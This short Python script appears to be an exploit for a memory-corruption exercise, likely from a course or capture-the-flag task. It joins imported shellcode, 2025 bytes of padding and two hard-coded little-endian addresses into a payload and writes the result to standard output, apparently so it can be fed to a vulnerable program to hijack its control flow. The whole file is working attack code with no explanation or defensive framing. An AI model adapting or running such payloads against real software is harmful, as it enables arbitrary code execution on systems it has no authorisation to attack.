from struct import pack 
from shellcode import shellcode
import sys
padding = 2025
inj = ('\x12'*padding).encode('ASCII')+pack("<I", 0xfffe9f18)+pack("<I", 0xfffea72c)
sys.stdout.buffer.write(shellcode+inj)
